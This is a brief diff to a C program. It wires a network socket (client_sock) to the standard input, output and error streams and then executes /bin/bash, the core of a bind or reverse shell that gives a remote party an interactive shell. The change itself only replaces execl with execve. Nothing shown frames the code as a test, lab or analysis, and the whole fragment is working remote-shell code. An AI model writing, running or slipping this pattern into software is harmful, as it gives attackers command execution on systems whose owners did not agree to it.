@@ -40,7 +40,7 @@ int main(int argc, char** argv){
 		dup2(client_sock, 0);
 		dup2(client_sock, 1);
 		dup2(client_sock, 2);
-		execl("/bin/bash", "/bin/bash", NULL);
+		execve("/bin/bash", NULL, NULL);
 	}
 	return 0;
 }
